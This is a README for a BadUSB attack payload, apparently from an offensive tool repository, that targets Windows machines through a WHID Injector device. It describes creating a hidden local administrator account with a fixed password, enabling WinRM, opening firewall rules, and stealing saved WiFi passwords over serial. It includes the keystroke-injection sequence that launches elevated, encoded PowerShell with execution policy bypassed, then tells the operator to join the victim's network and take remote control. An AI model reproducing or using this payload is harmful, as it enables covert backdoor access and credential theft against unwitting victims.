# Infectionless

BadUSB payload for Windows that enables WinRM and Exfiltrates WIFI passwords.

This payload is prepared for WHID Injector Serial exfiltration method and needs local admin privs.

<br><br>

How it works (check infectionless.ps1 for details):

1. create a local administrator user account (Guest:123456)
2. hidde the user account
3. enables WinRM, wich will automatically enable FilterAdministratorToken=1
4. enables in firewall "file and printer sharing" needed for WinRM connection
5. grab WIFI keys and exfiltrate them to the WHID injector via Serial

<br><br>

Change Strings to the target system language (by default in Spanish):
* netsh advfirewall firewall set rule group="Compartir archivos e impresoras" new enable=Yes
* $SSIDSearchResult = $profileOutput| Select-String -Pattern 'Nombre de SSID'
* $passwordSearchResult = $profileOutput| Select-String -Pattern 'Contenido de la clave'

Change VID and PID to your WHID Injectors (get them with USBLogView):
* $s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like'USB\\VID_1b4f&PID_9208%'").Caption


<br><br>

WHID Injector payload


`Press:131+114`

`Print:powershell Start-Process cmd -Verb runAs`

`Press:176`

`CustomDelay:1500`

`Press:216`

`Press:176`

`Press:176`

`PrintLine:powershell -nop -noni -w 1 -Exec Bypass -ec <encoded-payload>`

<br><br>

Then connect to the victim Wifi to get LAN access (use Yagi antenna).

RCE via WinRM and enjoy :)

![](/img/cme-winrm.png "CME WinRM")